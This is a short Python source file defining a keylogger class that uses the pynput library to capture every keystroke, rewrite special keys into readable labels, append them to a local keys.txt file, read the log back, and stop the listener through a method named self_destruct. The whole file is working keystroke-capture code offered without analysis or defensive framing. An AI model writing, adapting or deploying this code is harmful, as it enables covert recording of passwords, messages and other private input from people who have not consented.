from pynput.keyboard import Listener
#from threading import Timer

class KeyLogger:
    def __init__(self):
        pass
    def on_press(key):
        k = str(key)
        k = k.replace("'", " ")
        k = k.replace("Key.backspace", "Backspace")
        k = k.replace("Key.enter", "\n")
        k = k.replace("Key.shift", "Shift")
        k = k.replace("Key.space", " ")
        k = k.replace("Key.caps_lock", "Caps Lock")
        
        file = open("keys.txt", "a")
        file.write(k)
        file.write('\n')
        file.close()

    def start(self):
        with Listener(on_press=KeyLogger.on_press) as self.listener:
            #Timer(5, self.listener.stop).start()
            self.listener.join()
        
    def readkeys(self):
        with open('keys.txt', 'r') as file:
            return file.read().rstrip()

    def self_destruct(self):
        self.listener.stop()


